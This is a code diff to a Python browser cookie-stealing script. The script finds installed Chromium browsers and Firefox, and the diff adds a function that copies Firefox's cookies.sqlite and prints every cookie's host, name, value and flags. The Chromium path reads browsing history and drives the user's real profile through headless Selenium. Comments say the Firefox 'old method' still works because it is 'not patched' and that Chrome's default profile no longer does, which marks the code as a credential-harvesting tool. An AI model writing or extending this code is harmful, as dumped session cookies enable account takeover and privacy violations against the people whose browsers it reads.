@@ -1,6 +1,7 @@
 import os
 import sqlite3
 import shutil
+import tempfile
 from pathlib import Path
 from urllib.parse import urlparse
 import ipaddress
@@ -32,17 +33,31 @@ def FindBrowserPaths(): # NOT ALL TESTED
         "SPUTNIK": (r"%LOCALAPPDATA%\Sputnik\Sputnik.exe", ["LOCALAPPDATA", "Sputnik", "User Data"]),
         "VIVALDI": (r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe", ["LOCALAPPDATA", "Vivaldi", "User Data"]),
         "CHROME_SXS": (r"C:\Program Files (x86)\Google\Chrome SxS\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome SxS", "User Data"]),
-        "CHROME": (r"C:\Program Files\Google\Chrome\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome", "User Data"]),
+        # "CHROME": (r"C:\Program Files\Google\Chrome\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome", "User Data"]), # Not Working ( Default Profile Poopy :sob: )
         "EPIC_PRIVACY_BROWSER": (r"%LOCALAPPDATA%\Epic Privacy Browser\Application\epic.exe", ["LOCALAPPDATA", "Epic Privacy Browser", "User Data"]),
         "MICROSOFT_EDGE": (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ["LOCALAPPDATA", "Microsoft", "Edge", "User Data"]),
         "URAN": (r"%LOCALAPPDATA%\Uran\Application\uran.exe", ["LOCALAPPDATA", "Uran", "User Data"]),
         "YANDEX": (r"%LOCALAPPDATA%\Yandex\YandexBrowser\Application\browser.exe", ["LOCALAPPDATA", "Yandex", "YandexBrowser", "User Data"]),
         "BRAVE": (r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", ["LOCALAPPDATA", "BraveSoftware", "Brave-Browser", "User Data"]), # TESTED WORKING
         "IRIDIUM": (r"C:\Program Files\Iridium\iridium.exe", ["LOCALAPPDATA", "Iridium", "User Data"]),
+
+        # Non Chromium
+        "FIREFOX": (None, ["APPDATA", "Mozilla", "Firefox", "Profiles"]) # TESTED WORKING
     }
 
     Installed = {}
     for Name, (ExeTemplate, UserDataParts) in Browsers.items():
+        if Name == "FIREFOX":
+            ProfileBase = os.path.join(os.environ[UserDataParts[0]], *UserDataParts[1:])
+            if not os.path.isdir(ProfileBase):
+                continue
+            for Profile in os.listdir(ProfileBase):
+                CookiesPath = os.path.join(ProfileBase, Profile, "cookies.sqlite")
+                if os.path.exists(CookiesPath):
+                    Installed[Name] = {"USER_DATA_DIR": os.path.join(ProfileBase, Profile)}
+                    break
+            continue
+
         ExePath = os.path.expandvars(ExeTemplate)
         if not os.path.isfile(ExePath):
             continue
@@ -50,10 +65,11 @@ def FindBrowserPaths(): # NOT ALL TESTED
         if not os.path.isdir(UserDataDir):
             continue
         Installed[Name] = {"EXE_PATH": ExePath, "USER_DATA_DIR": UserDataDir}
-
     return Installed
 
 def IsBrowserRunning(ExePath): # Browsers (may) use a profile lock etc.., so I prefer not to handle that and just not run if the browser is open
+    if not ExePath:
+        return False
     ExeName = os.path.basename(ExePath).lower()
     for Proc in psutil.process_iter(['name']):
         try:
@@ -63,7 +79,7 @@ def IsBrowserRunning(ExePath): # Browsers (may) use a profile lock etc.., so I p
             continue
     return False
 
-def IsValidHost(Host): 
+def IsValidHost(Host):
     try:
         Ip = ipaddress.ip_address(Host)
         return not Ip.is_loopback
@@ -96,8 +112,6 @@ def IsAuthProtected(Url):
 
 def FilterUrlsConcurrently(Urls): # Filter URLs since Selenium stops on websites that have a WWW-Authenticate
     from sys import stdout
-    from concurrent.futures import ThreadPoolExecutor, as_completed
-
     Filtered = []
     Total = len(Urls)
     Completed = 0
@@ -113,7 +127,6 @@ def FilterUrlsConcurrently(Urls): # Filter URLs since Selenium stops on websites
                 bar = "[" + "#" * progress + "-" * (40 - progress) + "]"
                 stdout.write(f"\r{bar} {Completed}/{Total} URLs checked")
                 stdout.flush()
-
                 try:
                     Result = Future.result()
                     if not Result:
@@ -122,7 +135,6 @@ def FilterUrlsConcurrently(Urls): # Filter URLs since Selenium stops on websites
                         print(f"\nSKIPPED AUTH-PROTECTED: {Url}")
                 except Exception as E:
                     print(f"\nSKIPPED FAILED CHECK: {Url} ({E})")
-
         except KeyboardInterrupt:
             print("\n[KeyboardInterrupt] Cancelling URL filtering...")
             for future in Futures:
@@ -140,9 +152,18 @@ def CreateDriver(ExePath, UserDataDir):
     OptionsObj.add_argument("--disable-dev-shm-usage")
     OptionsObj.add_argument("--headless=new")
     OptionsObj.page_load_strategy = "eager"
-
     return webdriver.Chrome(options=OptionsObj)
 
+def ExtractFirefoxCookies(ProfilePath):
+    TempPath = tempfile.mktemp()
+    shutil.copy2(os.path.join(ProfilePath, 'cookies.sqlite'), TempPath)
+    Conn = sqlite3.connect(TempPath)
+    Cursor = Conn.cursor()
+    Cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
+    Cookies = Cursor.fetchall()
+    Conn.close()
+    os.remove(TempPath)
+    return Cookies
 
 def Main():
     Browsers = FindBrowserPaths()
@@ -150,8 +171,17 @@ def Main():
         for Name, Paths in Browsers.items():
             print(f"--- browser: {Name} ---")
 
-            if IsBrowserRunning(Paths["EXE_PATH"]):
+            if Name != "FIREFOX" and IsBrowserRunning(Paths["EXE_PATH"]):
                 print(f"SKIPPED {Name} - PROCESS IN USE")
+                continue
+
+            if Name == "FIREFOX": # Using old method on Firefox, since its not patched. :D
+                try:
+                    Cookies = ExtractFirefoxCookies(Paths["USER_DATA_DIR"])
+                    for C in Cookies:
+                        print(f'Host: {C[0]}\nName: {C[1]}\nValue: {C[2]}\nPath: {C[3]}\nExpiry: {C[4]}\nSecure: {bool(C[5])}\nHttpOnly: {bool(C[6])}\n---')
+                except Exception as E:
+                    print(f"FAILED TO EXTRACT FIREFOX COOKIES: {E}")
                 continue
 
             HistoryPath = Path(Paths["USER_DATA_DIR"]) / "Default" / "History"
@@ -159,9 +189,20 @@ def Main():
                 print(f"History file not found for {Name}: {HistoryPath}")
                 continue
 
-            Urls = GetCleanUrls(HistoryPath)
+            try:
+                Urls = GetCleanUrls(HistoryPath)
+            except Exception as e:
+                print(f"Failed to read history for {Name}: {e}")
+                continue
+
             Urls = FilterUrlsConcurrently(Urls)
-            Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"])
+
+            try:
+                Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"])
+            except Exception as e:
+                print(f"Failed to create driver for {Name}: {e}")
+                continue
+
             Wait = WebDriverWait(Driver, 5)
 
             try:
@@ -180,7 +221,6 @@ def Main():
                 print("\n[KeyboardInterrupt] Quitting driver...")
             finally:
                 Driver.quit()
-
             print("Finally Completed...")
     except KeyboardInterrupt:
         print("\n[KeyboardInterrupt] Exiting.")
